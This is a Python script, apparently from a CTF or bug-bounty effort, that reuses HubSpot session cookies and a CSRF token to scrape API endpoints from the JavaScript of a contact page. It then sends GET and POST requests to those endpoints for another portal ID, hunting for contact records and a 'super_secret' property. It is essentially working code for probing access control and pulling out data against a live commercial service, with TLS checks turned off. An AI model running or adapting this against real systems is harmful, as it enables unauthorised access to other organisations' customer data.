#!/usr/bin/env python3
"""
Extract and test XHR API endpoints from contact page JavaScript
The page loads (200) but data comes via XHR - let's find those endpoints
"""

import requests
import json
import os
import re
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("XHR Endpoint Interception")
print("="*80)

headers = {
    'Cookie': SESSION_COOKIES,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

# Fetch a contact page
print(f"\n[*] Fetching contact page to extract JavaScript...")
url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1'
r = requests.get(url, headers=headers, verify=False, timeout=15)

if r.status_code != 200:
    print(f"Failed to load page: {r.status_code}")
    exit(1)

print(f"Page loaded: {len(r.text)} bytes")
html = r.text

# ============================================================================
# EXTRACT JAVASCRIPT BUNDLE URLS
# ============================================================================

print("\n[*] Extracting JavaScript bundle URLs...")

# Find all script tags
js_urls = re.findall(r'<script[^>]+src=["\'](https://[^"\']+\.js[^"\']*)["\'"]', html)
print(f"Found {len(js_urls)} JavaScript files")

# ============================================================================
# ANALYZE JAVASCRIPT FOR API ENDPOINTS
# ============================================================================

print("\n[*] Downloading and analyzing JavaScript bundles...")

api_endpoints = set()

# Common API patterns to look for
api_patterns = [
    r'["\']/(api/[^"\']+)["\']',
    r'["\']https://app\.hubspot\.com/(api/[^"\']+)["\']',
    r'apiUrl\s*:\s*["\']([^"\']+)["\']',
    r'endpoint\s*:\s*["\']([^"\']+)["\']',
    r'url\s*:\s*["\']/(api/[^"\']+)["\']',
]

for i, js_url in enumerate(js_urls[:10], 1):  # Limit to first 10 bundles
    try:
        print(f"\n  [{i}/{min(10, len(js_urls))}] {js_url[:80]}...")

        # Download JavaScript
        r_js = requests.get(js_url, verify=False, timeout=15)
        if r_js.status_code != 200:
            continue

        js_code = r_js.text
        print(f"      Downloaded: {len(js_code)} bytes")

        # Extract API endpoints
        for pattern in api_patterns:
            matches = re.findall(pattern, js_code)
            for match in matches:
                if 'api' in match.lower():
                    api_endpoints.add(match)

    except Exception as e:
        print(f"      Error: {str(e)[:50]}")

print(f"\n[*] Found {len(api_endpoints)} unique API endpoints in JavaScript")

# ============================================================================
# TEST DISCOVERED API ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("Testing Discovered API Endpoints")
print("="*80)

csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

api_headers = {
    'Cookie': SESSION_COOKIES,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
}

if csrf_token:
    api_headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

findings = []

# Sort and deduplicate endpoints
tested_endpoints = set()

for endpoint in sorted(api_endpoints):
    # Skip non-contact related endpoints
    if not any(term in endpoint.lower() for term in ['contact', 'crm', 'object', 'record']):
        continue

    # Build full URL if relative
    if endpoint.startswith('/'):
        test_url = f'https://app.hubspot.com{endpoint}'
    elif not endpoint.startswith('http'):
        test_url = f'https://app.hubspot.com/{endpoint}'
    else:
        test_url = endpoint

    # Replace placeholders with actual values
    test_url = test_url.replace('{portalId}', TARGET_PORTAL)
    test_url = test_url.replace('{objectId}', '1')
    test_url = test_url.replace('{contactId}', '1')
    test_url = test_url.replace('{vid}', '1')

    # Add portalId parameter if not present
    if 'portalId=' not in test_url and '?' not in test_url:
        test_url += f'?portalId={TARGET_PORTAL}'
    elif 'portalId=' not in test_url:
        test_url += f'&portalId={TARGET_PORTAL}'

    # Skip if already tested
    if test_url in tested_endpoints:
        continue
    tested_endpoints.add(test_url)

    try:
        print(f"\n[*] {test_url[:100]}")

        # Try GET request
        r = requests.get(test_url, headers=api_headers, verify=False, timeout=10)
        print(f"    GET: {r.status_code}")

        if r.status_code == 200:
            print(f"    *** SUCCESS! ***")
            try:
                data = r.json()
                print(f"    Response: {json.dumps(data, indent=2)[:300]}")

                # Check for contact data
                data_str = json.dumps(data).lower()
                if 'super_secret' in data_str or 'firstname' in data_str:
                    print(f"\n    *** CONTAINS CONTACT DATA! ***")
                    print(json.dumps(data, indent=2)[:800])

                    findings.append({
                        'url': test_url,
                        'method': 'GET',
                        'data': data
                    })

                    if 'super_secret' in data_str:
                        print(f"\n    *** FOUND super_secret! ***")
            except:
                print(f"    Response (not JSON): {r.text[:200]}")

        # Try POST if endpoint looks like it might accept POST
        if any(term in test_url.lower() for term in ['search', 'query', 'batch']):
            post_data = {
                'portalId': TARGET_PORTAL,
                'properties': ['firstname', 'super_secret', 'email']
            }

            r = requests.post(test_url, headers=api_headers, json=post_data, verify=False, timeout=10)
            print(f"    POST: {r.status_code}")

            if r.status_code == 200:
                print(f"    *** POST SUCCESS! ***")
                try:
                    data = r.json()
                    print(f"    Response: {json.dumps(data, indent=2)[:300]}")
                except:
                    pass

    except Exception as e:
        print(f"    Error: {str(e)[:80]}")

print("\n" + "="*80)
print("XHR Endpoint Analysis Complete")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} WORKING ENDPOINTS WITH DATA! ***\n")

    with open('/home/user/Hub/findings/xhr_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("SAVED: findings/xhr_findings.json")

    for finding in findings:
        data_str = json.dumps(finding).lower()
        if 'super_secret' in data_str:
            print("\n" + "="*80)
            print("*** POTENTIAL CTF FLAG! ***")
            print("="*80)
            print(json.dumps(finding, indent=2))
else:
    print("\nNo working XHR endpoints found.")
